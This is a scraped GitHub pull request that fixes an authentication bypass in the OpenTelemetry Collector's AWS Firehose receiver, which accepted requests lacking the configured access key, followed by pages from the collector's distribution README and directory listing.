Dismiss alert

{{ message }}

[open-telemetry](/open-telemetry)
/
**[opentelemetry-collector-contrib](/open-telemetry/opentelemetry-collector-contrib)**
Public

* [Notifications](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-contrib) You must be signed in to change notification settings
* [Fork
  2.5k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-contrib)
* [Star
   3.2k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-contrib)

* [Code](/open-telemetry/opentelemetry-collector-contrib)
* [Issues
  748](/open-telemetry/opentelemetry-collector-contrib/issues)
* [Pull requests
  145](/open-telemetry/opentelemetry-collector-contrib/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector-contrib/discussions)
* [Actions](/open-telemetry/opentelemetry-collector-contrib/actions)
* [Projects
  0](/open-telemetry/opentelemetry-collector-contrib/projects)
* [Security](/open-telemetry/opentelemetry-collector-contrib/security)
* [Insights](/open-telemetry/opentelemetry-collector-contrib/pulse)

Additional navigation options

* [Code](/open-telemetry/opentelemetry-collector-contrib)
* [Issues](/open-telemetry/opentelemetry-collector-contrib/issues)
* [Pull requests](/open-telemetry/opentelemetry-collector-contrib/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector-contrib/discussions)
* [Actions](/open-telemetry/opentelemetry-collector-contrib/actions)
* [Projects](/open-telemetry/opentelemetry-collector-contrib/projects)
* [Security](/open-telemetry/opentelemetry-collector-contrib/security)
* [Insights](/open-telemetry/opentelemetry-collector-contrib/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-contrib%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-contrib%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# [receiver/awsfirehose]: Fix access key validation #34847

 Merged

[codeboten](/codeboten)
merged 2 commits into
[open-telemetry:main](/open-telemetry/opentelemetry-collector-contrib/tree/main "open-telemetry/opentelemetry-collector-contrib:main")
from
[Aneurysm9:advisory-fix-1](/Aneurysm9/opentelemetry-collector-contrib/tree/advisory-fix-1 "Aneurysm9/opentelemetry-collector-contrib:advisory-fix-1")

Aug 27, 2024

 Merged

# [[receiver/awsfirehose]: Fix access key validation](#top) #34847

[codeboten](/codeboten)
merged 2 commits into
[open-telemetry:main](/open-telemetry/opentelemetry-collector-contrib/tree/main "open-telemetry/opentelemetry-collector-contrib:main")
from
[Aneurysm9:advisory-fix-1](/Aneurysm9/opentelemetry-collector-contrib/tree/advisory-fix-1 "Aneurysm9/opentelemetry-collector-contrib:advisory-fix-1")

Aug 27, 2024

[Conversation
3](/open-telemetry/opentelemetry-collector-contrib/pull/34847)
[Commits
2](/open-telemetry/opentelemetry-collector-contrib/pull/34847/commits)
[Checks
156](/open-telemetry/opentelemetry-collector-contrib/pull/34847/checks)
[Files changed](/open-telemetry/opentelemetry-collector-contrib/pull/34847/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=60&v=4)](/Aneurysm9)

Copy link

Member

### @Aneurysm9 **[Aneurysm9](/Aneurysm9)** commented [Aug 26, 2024](#issue-2487243392) • edited by arminru Loading

**Description:** The `awsfirehosereceiver` can be configured to receive CloudWatch metrics via an AWS Firehose Stream. [Firehose sets the header](https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html) `X-Amz-Firehose-Access-Key` with an arbitrary configured string. The OpenTelemetry Collector awsfirehosereceiver can optionally be configured to require this key on incoming requests. However, when this is configured it still accepts incoming requests with no key.

**Link to tracking Issue:** [Advisory](https://github.com/open-telemetry/opentelemetry-collector-contrib/security/advisories/GHSA-prf6-xjxh-p698)

**Testing:** Tested via reproduction script provided by reporter.

**Fixes:** [GHSA-prf6-xjxh-p698](https://github.com/open-telemetry/opentelemetry-collector-contrib/security/advisories/GHSA-prf6-xjxh-p698 "GHSA-prf6-xjxh-p698")

Sorry, something went wrong.

All reactions

[![@DouglasHeriot](https://avatars.githubusercontent.com/u/238401?s=40&v=4)](/DouglasHeriot)

`[Fix awsfirehosereceiver access key handling](/open-telemetry/opentelemetry-collector-contrib/pull/34847/commits/78df2a9151872e4d2a5767388d9a8fc250a8269b "Fix awsfirehosereceiver access key handling")`

`[78df2a9](/open-telemetry/opentelemetry-collector-contrib/pull/34847/commits/78df2a9151872e4d2a5767388d9a8fc250a8269b)`

 [![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)
[Aneurysm9](/Aneurysm9)
requested review from
a team and
[crobert-1](/crobert-1)
[August 26, 2024 16:19](#event-14015874593)

[![@linux-foundation-easycla](https://avatars.githubusercontent.com/in/17893?s=80&v=4)](/apps/linux-foundation-easycla)
[![Linux Foundation: EasyCLA](https://avatars.githubusercontent.com/in/17893?s=40&u=260318c484944b88be09bc7be308293c67a26e7f&v=4)](https://github.com/apps/linux-foundation-easycla)

Copy link

### **[linux-foundation-easycla](/apps/linux-foundation-easycla) bot** commented [Aug 26, 2024](#issuecomment-2310584705) • edited Loading

| [CLA Signed](https://easycla.lfx.linuxfoundation.org/#/?version=2)The committers listed above are authorized under a signed CLA.   * ✅ login: Aneurysm9 / name: Anthony Mirabella ([27d4c5f](https://github.com/open-telemetry/opentelemetry-collector-contrib/commit/27d4c5fff36a3ac7692238c6fd8119bf80f86783)) * ✅ login: DouglasHeriot / name: Douglas Heriot ([78df2a9](https://github.com/open-telemetry/opentelemetry-collector-contrib/commit/78df2a9151872e4d2a5767388d9a8fc250a8269b)) |
| --- |

All reactions

Sorry, something went wrong.

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
assigned [atoulme](/atoulme)
[Aug 26, 2024](#event-14015878753)

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
added
the
[receiver/awsfirehose](/open-telemetry/opentelemetry-collector-contrib/labels/receiver/awsfirehose)
label
[Aug 26, 2024](#event-14015879059)

[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&v=4)](/Aneurysm9)

`[Add changelog entry](/open-telemetry/opentelemetry-collector-contrib/pull/34847/commits/27d4c5fff36a3ac7692238c6fd8119bf80f86783 "Add changelog entry

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>")`
 …

`[27d4c5f](/open-telemetry/opentelemetry-collector-contrib/pull/34847/commits/27d4c5fff36a3ac7692238c6fd8119bf80f86783)`

```
Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>
```

 [![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)
[Aneurysm9](/Aneurysm9)
[force-pushed](/open-telemetry/opentelemetry-collector-contrib/compare/e55ee206aa694b732d1bf09c1abbd72900ff182d..27d4c5fff36a3ac7692238c6fd8119bf80f86783)
the
advisory-fix-1

branch
from
[`e55ee20`](/open-telemetry/opentelemetry-collector-contrib/commit/e55ee206aa694b732d1bf09c1abbd72900ff182d) to
[`27d4c5f`](/open-telemetry/opentelemetry-collector-contrib/commit/27d4c5fff36a3ac7692238c6fd8119bf80f86783)  [Compare](/open-telemetry/opentelemetry-collector-contrib/compare/e55ee206aa694b732d1bf09c1abbd72900ff182d..27d4c5fff36a3ac7692238c6fd8119bf80f86783)
[August 26, 2024 16:19](#event-14015882053)

[![@crobert-1](https://avatars.githubusercontent.com/u/92119472?s=80&u=1bd20ce73d8d0d8b04cdbb82d73e425c0f166b2e&v=4)](/crobert-1)

Copy link

Member

### **[crobert-1](/crobert-1)** commented [Aug 26, 2024](#issuecomment-2310597117)

| [@DouglasHeriot](https://github.com/DouglasHeriot): Can you please sign the CLA? We won't be able to merge this PR until all commit authors have signed it. |
| --- |

 👍
2
 codeboten and DouglasHeriot reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![crobert-1](https://avatars.githubusercontent.com/u/92119472?s=60&v=4)](/crobert-1)

**[crobert-1](/crobert-1)**
approved these changes
[Aug 26, 2024](#pullrequestreview-2261112800)

 [View reviewed changes](/open-telemetry/opentelemetry-collector-contrib/pull/34847/files/27d4c5fff36a3ac7692238c6fd8119bf80f86783)

[![codeboten](https://avatars.githubusercontent.com/u/223565?s=60&v=4)](/codeboten)

**[codeboten](/codeboten)**
approved these changes
[Aug 26, 2024](#pullrequestreview-2261762690)

 [View reviewed changes](/open-telemetry/opentelemetry-collector-contrib/pull/34847/files/27d4c5fff36a3ac7692238c6fd8119bf80f86783)

[![@DouglasHeriot](https://avatars.githubusercontent.com/u/238401?s=80&u=b0207c81f52a9f937c467d9d4d69d6db0bb4ff3a&v=4)](/DouglasHeriot)

Copy link

Contributor

### **[DouglasHeriot](/DouglasHeriot)** commented [Aug 27, 2024](#issuecomment-2311335683)

| Done, we’ve got a Corporate CLA already signed. |
| --- |

 👍
1
 codeboten reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

 Hide details
View details

[![@codeboten](https://avatars.githubusercontent.com/u/223565?s=40&u=6864c4ecb6a448e40a395483e4ac2a77dd347ac4&v=4)](/codeboten)
[codeboten](/codeboten)
merged commit [`371bf6a`](/open-telemetry/opentelemetry-collector-contrib/commit/371bf6afbd7cfa3253fa1674f5444064e86ef0ac)
into
open-telemetry:main

[Aug 27, 2024](https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847#event-14020491017)
156 checks passed

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
added this to the [next release](/open-telemetry/opentelemetry-collector-contrib/milestone/45) milestone
[Aug 27, 2024](#event-14020492272)

 [![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)
[Aneurysm9](/Aneurysm9)
deleted the
advisory-fix-1

branch
[August 27, 2024 14:55](#event-14030365076)

[![@GoVulnBot](https://avatars.githubusercontent.com/u/96493708?s=40&v=4)](/GoVulnBot)
[GoVulnBot](/GoVulnBot)
mentioned this pull request
[Aug 28, 2024](#ref-issue-2493060138)

[x/vulndb: potential Go vuln in github.com/open-telemetry/opentelemetry-collector-contrib: CVE-2024-45043
golang/vulndb#3102](/golang/vulndb/issues/3102)

Closed

[f7o](/f7o)
pushed a commit
to f7o/opentelemetry-collector-contrib
that referenced
this pull request
[Sep 12, 2024](#ref-commit-c52be30)
[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9) [![@DouglasHeriot](https://avatars.githubusercontent.com/u/238401?s=40&u=b0207c81f52a9f937c467d9d4d69d6db0bb4ff3a&v=4)](/DouglasHeriot) [![@f7o](https://avatars.githubusercontent.com/u/6060227?s=40&v=4)](/f7o)

`[[receiver/awsfirehose]: Fix access key validation (](/f7o/opentelemetry-collector-contrib/commit/c52be3093fd9b8d0a01610b18cbc407a6b5c48d4 "[receiver/awsfirehose]: Fix access key validation (#34847)

**Description:** The `awsfirehosereceiver` can be configured to receive
CloudWatch metrics via an AWS Firehose Stream. [Firehose sets the
header](https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html)
`X-Amz-Firehose-Access-Key` with an arbitrary configured string. The
OpenTelemetry Collector awsfirehosereceiver can optionally be configured
to require this key on incoming requests. However, when this is
configured it still accepts incoming requests with no key.

**Link to tracking Issue:**
[Advisory](https://github.com/open-telemetry/opentelemetry-collector-contrib/security/advisories/GHSA-prf6-xjxh-p698)

**Testing:** Tested via reproduction script provided by reporter.

---------

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>
Co-authored-by: Douglas Heriot <dheriot@google.com>")[open-telemetry#34847](https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847)[)](/f7o/opentelemetry-collector-contrib/commit/c52be3093fd9b8d0a01610b18cbc407a6b5c48d4 "[receiver/awsfirehose]: Fix access key validation (#34847)

**Description:** The `awsfirehosereceiver` can be configured to receive
CloudWatch metrics via an AWS Firehose Stream. [Firehose sets the
header](https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html)
`X-Amz-Firehose-Access-Key` with an arbitrary configured string. The
OpenTelemetry Collector awsfirehosereceiver can optionally be configured
to require this key on incoming requests. However, when this is
configured it still accepts incoming requests with no key.

**Link to tracking Issue:**
[Advisory](https://github.com/open-telemetry/opentelemetry-collector-contrib/security/advisories/GHSA-prf6-xjxh-p698)

**Testing:** Tested via reproduction script provided by reporter.

---------

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>
Co-authored-by: Douglas Heriot <dheriot@google.com>")`
…

`[c52be30](/f7o/opentelemetry-collector-contrib/commit/c52be3093fd9b8d0a01610b18cbc407a6b5c48d4)`

```
**Description:** The `awsfirehosereceiver` can be configured to receive
CloudWatch metrics via an AWS Firehose Stream. [Firehose sets the
header](<https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html>)
`X-Amz-Firehose-Access-Key` with an arbitrary configured string. The
OpenTelemetry Collector awsfirehosereceiver can optionally be configured
to require this key on incoming requests. However, when this is
configured it still accepts incoming requests with no key.

**Link to tracking Issue:**
[Advisory]([GHSA-prf6-xjxh-p698](https://github.com/open-telemetry/opentelemetry-collector-contrib/security/advisories/GHSA-prf6-xjxh-p698 "GHSA-prf6-xjxh-p698"))

**Testing:** Tested via reproduction script provided by reporter.

---------

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>
Co-authored-by: Douglas Heriot <dheriot@google.com>
```

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-contrib%2Fpull%2F34847)

Reviewers

[![@crobert-1](https://avatars.githubusercontent.com/u/92119472?s=40&v=4)](/crobert-1) [crobert-1](/crobert-1)

crobert-1 approved these changes

[![@codeboten](https://avatars.githubusercontent.com/u/223565?s=40&v=4)](/codeboten) [codeboten](/codeboten)

codeboten approved these changes

Assignees

[![@atoulme](https://avatars.githubusercontent.com/u/16758?s=40&v=4)](/atoulme) [atoulme](/atoulme)

Labels

[receiver/awsfirehose](/open-telemetry/opentelemetry-collector-contrib/labels/receiver/awsfirehose)

Projects

None yet

Milestone

 [**v0.108.0**](/open-telemetry/opentelemetry-collector-contrib/milestone/45 "v0.108.0")

Development

Successfully merging this pull request may close these issues.

5 participants

[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=52&v=4)](/Aneurysm9) [![@crobert-1](https://avatars.githubusercontent.com/u/92119472?s=52&v=4)](/crobert-1) [![@DouglasHeriot](https://avatars.githubusercontent.com/u/238401?s=52&v=4)](/DouglasHeriot) [![@codeboten](https://avatars.githubusercontent.com/u/223565?s=52&v=4)](/codeboten) [![@atoulme](https://avatars.githubusercontent.com/u/16758?s=52&v=4)](/atoulme)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_8fdec36f_20250111_082356.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-releases%2Ftree%2Fmain%2Fdistributions%2Fotelcol-contrib)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-releases%2Ftree%2Fmain%2Fdistributions%2Fotelcol-contrib)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=open-telemetry%2Fopentelemetry-collector-releases)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-telemetry](/open-telemetry)
/
**[opentelemetry-collector-releases](/open-telemetry/opentelemetry-collector-releases)**
Public

* [Notifications](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-releases) You must be signed in to change notification settings
* [Fork
  165](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-releases)
* [Star
   267](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-releases)

* [Code](/open-telemetry/opentelemetry-collector-releases)
* [Issues
  56](/open-telemetry/opentelemetry-collector-releases/issues)
* [Pull requests
  12](/open-telemetry/opentelemetry-collector-releases/pulls)
* [Actions](/open-telemetry/opentelemetry-collector-releases/actions)
* [Projects
  0](/open-telemetry/opentelemetry-collector-releases/projects)
* [Security](/open-telemetry/opentelemetry-collector-releases/security)
* [Insights](/open-telemetry/opentelemetry-collector-releases/pulse)

Additional navigation options

* [Code](/open-telemetry/opentelemetry-collector-releases)
* [Issues](/open-telemetry/opentelemetry-collector-releases/issues)
* [Pull requests](/open-telemetry/opentelemetry-collector-releases/pulls)
* [Actions](/open-telemetry/opentelemetry-collector-releases/actions)
* [Projects](/open-telemetry/opentelemetry-collector-releases/projects)
* [Security](/open-telemetry/opentelemetry-collector-releases/security)
* [Insights](/open-telemetry/opentelemetry-collector-releases/pulse)

## Files

 main
## Breadcrumbs

1. [opentelemetry-collector-releases](/open-telemetry/opentelemetry-collector-releases/tree/main)
2. /[distributions](/open-telemetry/opentelemetry-collector-releases/tree/main/distributions)
/
# otelcol-contrib

/Copy path
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/open-telemetry/opentelemetry-collector-releases/commits/main/distributions/otelcol-contrib) main
## Breadcrumbs

1. [opentelemetry-collector-releases](/open-telemetry/opentelemetry-collector-releases/tree/main)
2. /[distributions](/open-telemetry/opentelemetry-collector-releases/tree/main/distributions)
/
# otelcol-contrib

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/open-telemetry/opentelemetry-collector-releases/tree/main/distributions) | | |
| [.goreleaser-build.yaml](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/.goreleaser-build.yaml ".goreleaser-build.yaml") | | [.goreleaser-build.yaml](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/.goreleaser-build.yaml ".goreleaser-build.yaml") |  |  |
| [.goreleaser.yaml](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/.goreleaser.yaml ".goreleaser.yaml") | | [.goreleaser.yaml](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/.goreleaser.yaml ".goreleaser.yaml") |  |  |
| [Dockerfile](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/Dockerfile "Dockerfile") | | [Dockerfile](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/Dockerfile "Dockerfile") |  |  |
| [README.md](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/README.md "README.md") | | [README.md](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/README.md "README.md") |  |  |
| [config.yaml](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/config.yaml "config.yaml") | | [config.yaml](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/config.yaml "config.yaml") |  |  |
| [manifest.yaml](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/manifest.yaml "manifest.yaml") | | [manifest.yaml](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/manifest.yaml "manifest.yaml") |  |  |
| [opentelemetry.ico](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/opentelemetry.ico "opentelemetry.ico") | | [opentelemetry.ico](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/opentelemetry.ico "opentelemetry.ico") |  |  |
| [otelcol-contrib.conf](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/otelcol-contrib.conf "otelcol-contrib.conf") | | [otelcol-contrib.conf](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/otelcol-contrib.conf "otelcol-contrib.conf") |  |  |
| [otelcol-contrib.service](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/otelcol-contrib.service "otelcol-contrib.service") | | [otelcol-contrib.service](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/otelcol-contrib.service "otelcol-contrib.service") |  |  |
| [postinstall.sh](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/postinstall.sh "postinstall.sh") | | [postinstall.sh](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/postinstall.sh "postinstall.sh") |  |  |
| [preinstall.sh](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/preinstall.sh "preinstall.sh") | | [preinstall.sh](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/preinstall.sh "preinstall.sh") |  |  |
| [preremove.sh](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/preremove.sh "preremove.sh") | | [preremove.sh](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/preremove.sh "preremove.sh") |  |  |
| [windows-installer.wxs](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/windows-installer.wxs "windows-installer.wxs") | | [windows-installer.wxs](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/windows-installer.wxs "windows-installer.wxs") |  |  |
| View all files | | |

## [README.md](#readme)

# OpenTelemetry Collector Contrib Distro

This distribution contains all the components from both the [OpenTelemetry Collector](https://github.com/open-telemetry/opentelemetry-collector) repository and the [OpenTelemetry Collector Contrib](https://github.com/open-telemetry/opentelemetry-collector-contrib) repository. This distribution includes open source and vendor supported components.

## Recommendation

As this distribution contains many components, it is a good starting point to try various configurations. However, when running in production, it is recommended to limit the collector to contain only the components necessary for an environment. Some reasons to do this:

* reduce the size of the collector, reducing deployment times for the collector
* improve the security of the collector by reducing the available attack surface area

Building a [custom collector](https://opentelemetry.io/docs/collector/custom-collector/) can be achieved using the [OpenTelemetry Collector Builder](https://github.com/open-telemetry/opentelemetry-collector/tree/main/cmd/builder).

## Components

The full list of components is available in the [manifest](/open-telemetry/opentelemetry-collector-releases/blob/main/distributions/otelcol-contrib/manifest.yaml)

### Rules for Component Inclusion

* Include all extensions at [Alpha stability](https://github.com/open-telemetry/opentelemetry-collector#alpha) or higher and pipeline components that have at least 1 signal at [Alpha stability](https://github.com/open-telemetry/opentelemetry-collector#alpha) or higher.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_4302b103_20250111_082354.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-contrib%2Ftree%2Fmain%2Freceiver%2Fawsfirehosereceiver)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
